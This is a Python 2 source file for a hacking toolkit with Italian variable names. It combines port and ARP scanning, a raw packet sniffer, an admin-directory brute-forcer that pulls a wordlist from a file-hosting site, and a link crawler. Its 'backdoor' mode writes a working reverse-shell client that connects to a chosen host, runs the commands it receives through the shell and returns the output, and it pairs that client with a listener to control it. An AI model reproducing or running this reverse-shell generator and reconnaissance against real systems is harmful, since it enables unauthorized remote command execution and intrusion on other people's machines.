import getopt
import sys
import os
import socket
import time
import struct
from uuid import getnode as get_mac
import urllib2
from struct import *
from binascii import hexlify

host = ''
porta = ''
gateway = ''
interfaccia = ''
url = ''
file_attach = ''
localip = ''
automatico = 'null'
backdoor = 'null'
manuale = 'null'
chat = 'null'
listenchat = 'null'
scan = 'null'
admin_directory = 'null'
estrai_link = 'null'
estrai_link_tutto = 'null'
sniff = 'null'

def aiuto():
	find_ip()
	print " "
	print "Use %s [topic] [host/port/interface/gateway/URL/file]" % (sys.argv[0])
	print " "
	print "-h  --help		View this screen"
	print "-m  --manual		Enable manual scanning (Required: host and port)"
	print "-a  --automatic	Enable automatic scanning (Required: host)"
	print "-s  --scan		Enable searching for hosts on the network (Required: network interface and gateway)"
	print "-b  --backdoor		Enable 'backdoor' mode (Required: host and port for the listener)"
	print "-d  --admin-directory	Enable the search for admin directory (Required: URL)"
	print "-e  --extract-link	Enables the extraction of directories of a website (if left alone, this parameter extracts only the links of a web page) (Required: URL)"
	print " |-->  -t  --all	Enable extraction of all directories of a website (Required: URL)"
	print "-c  --chat		Start a TCP chat (Required: host and port)"
	print " |-->   -l  --listen	Start a TCP chat, in server mode (Required: host and port)"
	print "--sniff-locale		Enable packet sniffing on the local host (%s)" % (localip)
	print " "
	print "universal:"
	print "-H 			Set the host"
	print "-p 			Set the port"
	print "-i 			Set the network interface"
	print "-g 			Set the gateway"
	print "-u 			Set the URL"
	print "-f 			Set the path of a file"
	print " "
	print "Examples:"
	print "%s -a -H 192.168.1.15" % (sys.argv[0])
	print "%s --backdoor -H 192.168.1.15 -p 8888" % (sys.argv[0])
	print "%s -e -t -u http://www.example.com/" % (sys.argv[0])
	print " "
	
def auto():
	portescan = [20, 21, 22, 23, 24, 25, 53, 69, 80, 110, 443, 445, 465, 1080, 1194, 1433, 3306, 3389, 9050, 9150]
	servizi = {20: 'ftp-data', 21: 'ftp', 22: 'ssh', 23: 'telnet', 24: 'priv-mail', 25: 'smtp', 53: 'domain', 69: 'tftp',
	 80: 'http', 110: 'pop3', 443: 'Tor', 445: 'microsoft-ds', 465: 'smtp-ssl', 1080: 'socks', 1194: 'OpenVPN', 1433: 'Microsoft-SQL-Server',
	  3306: 'MySQL Database system', 3389: 'Remote Desktop', 9050: 'TOR', 9150: 'Tor'}
	cont = 0
	tipo = ''
	successo = 0
	print "*----------------------------------*"
	print "| Status | Host / Port | Service  |"
	print "*----------------------------------*"
	while cont < len(portescan):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, portescan[cont]))
		except:
			cont = cont + 1
		else:
			if servizi[portescan[cont]] > 0:
				tipo = servizi[portescan[cont]]
				print "Success %s/%s	%s" % (host, portescan[cont], tipo)
				cont = cont + 1
				successo = successo + 1
			else:
				print "[!] An error occurred when querying the 'services' dictionary, please check the code"
				sys.exit()
	if successo > 0:
		sys.exit()
	else:
		print "[*] No port present in the range is open"
		sys.exit()
			
def back():
	print "[*] Creating the Client.py file ...."
	time.sleep(1)
	try:
		f = open("Client.py","w")
		f.write("import socket\n")
		f.write("import subprocess\n")
		f.write("import os\n")
		f.write("ip = '"+ host +"'\n")
		f.write("porta = "+ porta +"\n")
		f.write("buff = 1024\n")
		f.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
		f.write("s.connect((ip, porta))\n")
		f.write("while True:\n")
		f.write("	comando = s.recv(buff)\n")
		f.write("	if comando == 'exit':\n")
		f.write("		s.close()\n")
		f.write("		break\n")
		f.write("	else:\n")
		f.write("		proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
		f.write("		output= proc.stdout.read()+proc.stderr.read()\n")
		f.write("		s.send(output)\n")
		f.close()
	except:
		print "[!] Error creating Client.py"
		sys.exit()
	print "[*] Client.py successfully created\n"
	time.sleep(0.3)
	print "[*] Preparing the listener ...."
	buff = 1024
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, int(porta)))
	s.listen(1)
	time.sleep(2)
	print "[*] Listener ready"
	time.sleep(0.3)
	os.system("clear")
	print "[*] Listening to %s:%s" % (host, porta)
	
	conn, addr = s.accept()
	print "[+] Incoming connection from:", addr
	
	while True:
		comando = raw_input('$')
		if comando == "exit":
			conn.send(comando)
			conn.close
			break
		else:
			conn.send(comando)
			out = conn.recv(buff)
			print(out)
			
def manual():
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, int(porta)))
	except:
		print "*----------------------*"
		print "| Status | Host / Port |"
		print "*----------------------*"
		print "Failed %s/%s" % (host, porta)
	else:
		print "*----------------------*"
		print "| Status | Host / Port |"
		print "*----------------------*"
		print "Success %s/%s" % (host, porta)
		
def chatlisten():
	ip = host
	port = porta
	buff = 1024
	mess = ">> "
	port = int(port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print "[*] Listening to %s:%s" % (ip, port)
	conn, addr = s.accept()
	print "[+] Connected to", addr
	while True:
		ricevi = conn.recv(buff)
		print addr, mess, ricevi
		messaggio = raw_input('> ')
		conn.send(messaggio)
	
def chatconnect():
	ip = host
	port = porta
	buff = 1024
	mess = ">> "
	port = int(port)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		while True:
			messaggio = raw_input('> ')
			s.send(messaggio)
			ricevi = s.recv(buff)
			print ip, mess, ricevi
	except:
		print "[!] Unable to connect to the specified host"
	
def scanhost():
	target1 = ''
	target = ''
	ipaddress = '127.0.0.1'
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
	s.bind((interfaccia,0))
	mac =  hexlify(s.getsockname()[4])
	s.close()
	macaddress = mac
	vivi = []
	cont = 1
	if gateway == "192.168.1.1":
		target1 = '192.168.1.'
	elif gateway == "192.168.0.1":
		target1 = '192.168.0.'
	else:
		print gateway
		print "[!] Set up a correct gateway"
		sys.exit()
	print "[*] Host scan started on %s:" % (gateway)
	while cont < 20:
		target = target1 + str(cont)
		eth_hdr = struct.pack("!6s6s2s", '\xff\xff\xff\xff\xff\xff', macaddress.decode('hex'), '\x08\x06')             
		arp_hdr = struct.pack("!2s2s1s1s2s", '\x00\x01', '\x08\x00', '\x06', '\x04', '\x00\x01')          
		arp_sender = struct.pack("!6s4s", macaddress.replace(':','').decode('hex'), socket.inet_aton(ipaddress))
		arp_target = struct.pack("!6s4s", '\x00\x00\x00\x00\x00\x00', socket.inet_aton(target))
		try:
			rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
			rawSocket.bind((interfaccia, socket.htons(0x0806)))
			rawSocket.send(eth_hdr + arp_hdr + arp_sender + arp_target)
			
			rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
			rawSocket.settimeout(0.5)
			response = rawSocket.recvfrom(2048)
			if target == socket.inet_ntoa(response[0][28:32]):
				vivi.append(target)
				cont = cont + 1
		except:
			cont = cont + 1

	if len(vivi) == 0:
		print "[!] I have not found any hosts in this network, try running the program as root"
		sys.exit()
	else:
		if len(vivi) == 1:
			print "[+] 1 host scanned:"
		else:
			print "[+] %s scanned hosts:" % (len(vivi))
		for v in vivi:
			print v
def admin_directory_finder():
	trovati = 0
	scaricati = 0
	url_filtrato = url
	
	if url.endswith('/'):
		url_filtrato = url[:len(url) - 1]
		
	if file_attach != '':
		try:
			f = open(file_attach, 'r')
		except:
			print "[!] Unable to open file, please try again."
			sys.exit()
	else:
		try:
			scarica = open("dir.txt", 'wt')
			scarica.write(urllib2.urlopen('http://m.uploadedit.com/bbtc/1544476212379.txt').read())
			scarica.close()
			scaricati = 1
		except:
			print "[!] Unable to download the wordlist, try to do it manually:"
			print "https://cdn-02.anonfile.com/n1waqfnfb8/20f117ee-1544476781/dir.txt"
			sys.exit()
		f = open("dir.txt", 'r')
	listadir_dafile = f.readlines()
	print "[*] Scan admin directory started up %s\n" % url_filtrato
	for cont in listadir_dafile:
		try:
			urllib2.urlopen(url_filtrato+cont)
		except:
			continue
		else:
			print url_filtrato+cont
			trovati = trovati + 1
	if scaricati == 1:
		os.system("rm dir.txt")
	if trovati > 0:
		print "[*] Scan completed, %s directories found" % trovati
		sys.exit()
	else:
		print "[*] Scan completed, no directory found"
		sys.exit()
		
def linkextr():
	dm = url
	if url.endswith('/'):
		dm = url[:len(url) - 1]
	def findlink():
		scarica = open('index.txt', 'wt')
		scarica.write(urllib2.urlopen(dm).read())
		scarica.close
		f = open('index.txt', 'r')
		buff = f.readlines()
		cont = 0
		url = []
		for t in buff:
			if 'href' in t:
				link = t.replace("'"," ")
				link = t.replace('"'," ")
				parole=0
				a=link.split(" ")
				for i in a:
					if (i!=""):
						parole=parole+1
				while cont < parole:
					if 'href=' in a[cont]:
						if cont + 1 == len(a):
							sys.exit()
						else:
							url.append(a[cont+1])
					cont = cont + 1
				cont = 0
		os.system("rm index.txt")
		collsito = 0
		for u in url:
			if u.startswith('/'):
				collsito = collsito + 1
				print dm+u
			else:
				print u
		print "[*] Scan finished, %s links found, %s links to the site." % (len(url), collsito)

	try:
		findlink()
	except:
		print "[!] Unable to extract links from this site"
		os.system("rm index.txt")
		sys.exit()

def linkextrall():
	dm = url
	if url.endswith('/'):
		dm = url[:len(url) - 1]
	def findlink():
		sicraw = []
		contot = 0
		sicraw.append(dm)
		linkcont = 1
		while contot < len(sicraw):
			perurl = sicraw[contot]
			try:
				scarica = open('index.txt', 'wt')
				scarica.write(urllib2.urlopen(str(perurl)).read())
				scarica.close
			except:
				print "[failed] %s" % perurl
			f = open('index.txt', 'r')
			buff = f.readlines()
			cont = 0
			url = []
			for t in buff:
				if 'href' in t:
					link = t.replace("'"," ")
					link = t.replace('"'," ")
					parole=0
					a=link.split(" ")
					for i in a:
						if (i!=""):
							parole=parole+1
					while cont < parole:
						if 'href=' in a[cont]:
							if cont + 1 == len(a):
								sys.exit()
							else:
								url.append(a[cont+1])
						cont = cont + 1
					cont = 0
			os.system("rm index.txt")
			collsito = 0
			collsitoarr = []
			for u in url:
				if u.startswith('/'):
					collsito = collsito + 1
					collsitoarr.append(dm+u)
					print "[%s] %s%s" % (linkcont, dm, u)
					linkcont = linkcont + 1
				else:
					print "[%s] %s" % (linkcont, u)
					linkcont = linkcont + 1
			concheck = 0
			check = ['.png', '.jpg', '.zip', '.pdf']
			while concheck < len(collsitoarr):
				if not(collsitoarr[concheck].endswith('.pdf')):
					if not(collsitoarr[concheck].endswith('.png')):
						if not(collsitoarr[concheck].endswith('.zip')):
							sicraw.append(collsitoarr[concheck])
				concheck = concheck + 1
			contot = contot + 1
	findlink()
		
def find_ip():
	global localip
	localip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
	if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), 
	s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, 
	socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

def local_sniff():
	find_ip()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except:
		print "[!] it is necessary to be root for this function"
		sys.exit()
	s.bind((localip, 0))
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	print "[*] Sniffer started on %s" % (localip)
	while True:
		try:
			packet = s.recvfrom(65565)
			packet = packet[0]
			ip_header = packet[0:20]
			norm = unpack('!BBHHHBBH4s4s' , ip_header)
			server = socket.inet_ntoa(norm[8]);
			client = socket.inet_ntoa(norm[9]);
			try:
				domain = socket.gethostbyaddr(server)
			except:
				continue
			else:
				print "%s ---> %s" % (domain[0], client)
		except KeyboardInterrupt:
			print "[*] Sniff interrupted, exit."
			sys.exit()


options, remainder = getopt.getopt(sys.argv[1:], 'H:p:g:i:u:f:ahbmclsdet', ['automatic', 'help', 'backdoor', 'manual', 'chat', 'listen', 'scan', 'admin-directory', 'extract-link', 'all', 'local-sniff'])

for opt, arg in options:
	if opt in ('-h', '--help'):
		os.system("clear")
		aiuto()
		sys.exit()
	elif opt in ('-a', '--automatic'):
		automatico = "on"
	elif opt in ('-b', '--backdoor'):
		backdoor = "on"
	elif opt in ('-m', '--manual'):
		manuale = "on"
	elif opt in ('-c', '--chat'):
		chat = "on"
	elif opt == "-H":
		host = arg
	elif opt == "-p":
		porta = arg
	elif opt in ('-l', '--listen'):
		listenchat = "on"
	elif opt in ('-s', '--scan'):
		scan = "on"
	elif opt == "-g":
		gateway = arg
	elif opt == "-i":
		interfaccia = arg
	elif opt in ('-d', '--admin-directory'):
		admin_directory = "on"
	elif opt == "-u":
		url = arg
	elif opt == "-f":
		file_attach = arg
	elif opt in ('-e', '--extract-link'):
		estrai_link = "on"
	elif opt in ('-t', '--all'):
		estrai_link_tutto = "on"
	elif opt == "--local-sniff":
		os.system("clear")
		local_sniff()

if len(sys.argv) > 7:
	print "[!] Too many topics"
	sys.exit()
elif len(sys.argv) < 4:
	if len(sys.argv) == 1:
		os.system("clear")
		aiuto()
	else:
		print "[!] Enter more parameters"
		sys.exit()
else:
	if automatico == "on":
		if host != '':
			os.system("clear")
			auto()
		else:
			print "[!] Enter a host"
			sys.exit()
	elif backdoor == "on":
		if host and porta != '':
			os.system("clear")
			back()
		else:
			print "[!] Enter a host or a port"
			sys.exit()
	elif manuale == "on":
		if host and porta != '':
			os.system("clear")
			manual()
		else:
			print "[!] Enter a host or a port"
			sys.exit()
	elif chat == "on":
		if host and porta != '':
			if listenchat == "on":
				os.system("clear")
				chatlisten()
			else:
				os.system("clear")
				chatconnect()
		else:
			print "[!] Enter a host or a port"
			sys.exit()
	elif scan == "on":
		if gateway and interfaccia != '':
			os.system("clear")
			scanhost()
		else:
			print "[!] Enter a gateway or interface"
			sys.exit()
	elif admin_directory == "on":
		if url != '':
			os.system("clear")
			admin_directory_finder()
		else:
			print "[!] Enter a URL"
			sys.exit()
	elif estrai_link == "on":
		if url != '':
			if estrai_link_tutto == "on":
				os.system("clear")
				linkextrall()
			else:
				os.system("clear")
				linkextr()
		else:
			print "[!] Enter a URL"
			sys.exit()

	else:
		print "[!] Enter a basic function"
		sys.exit()
